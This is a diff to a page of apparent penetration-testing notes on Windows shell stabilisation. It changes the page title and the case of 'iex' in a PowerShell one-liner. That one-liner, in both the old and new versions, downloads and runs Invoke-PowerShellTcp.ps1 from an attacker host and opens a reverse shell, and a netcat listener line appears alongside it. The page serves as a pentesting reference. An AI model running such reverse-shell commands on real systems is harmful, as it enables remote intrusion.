@@ -1,6 +1,6 @@
 ---
 sidebar_position: 1
-title: Terminal Stabilisation
+title: Terminal
 description: Windows Shell Stabilisation
 keywords: [shell stabilisation windows, rlwrap, metasploit shell stabilisation]
 ---
@@ -16,7 +16,7 @@ rlwrap nc -nvlp $PORT
 - **[An interactive `PowerShell` Reverse Connect]**
 
 ```powershell
-powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER_IP -Port $PORT
+powershell IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER_IP -Port $PORT
 ```
 
 <br/>
